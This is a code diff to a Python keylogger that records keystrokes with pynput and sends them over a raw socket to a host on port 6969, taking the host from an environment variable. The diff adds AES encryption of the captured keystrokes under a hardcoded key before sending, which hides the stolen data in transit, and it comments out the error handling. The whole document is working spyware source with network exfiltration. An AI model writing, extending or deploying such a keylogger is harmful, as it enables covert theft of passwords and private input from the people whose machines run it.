@@ -6,6 +6,7 @@ import sys
 import socket
 import threading
 from pynput.keyboard import Key, Listener
+from Encryption import AESCipher
 
 logged_data = []
 
@@ -28,17 +29,19 @@ def run():
     global logged_data
 
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    s.connect((os.environ.get("HOST", "192.168.1.58"), 6969))
+    s.connect((os.environ.get("HOST", "0.0.0.0"), 6969))
 
     while True:
         time.sleep(1)
         if len(logged_data) > 1:
-            try:
-                s.send(logged_data)
-                logged_data = []
+            # try:
+            s.send(AESCipher("jesuistropfraiche").encrypt("".join(logged_data)))
+            logged_data = []
+            '''
             except Exception as expr:
                 print(expr)
                 sys.exit(1)
+            '''
 
 
 if __name__ == "__main__":
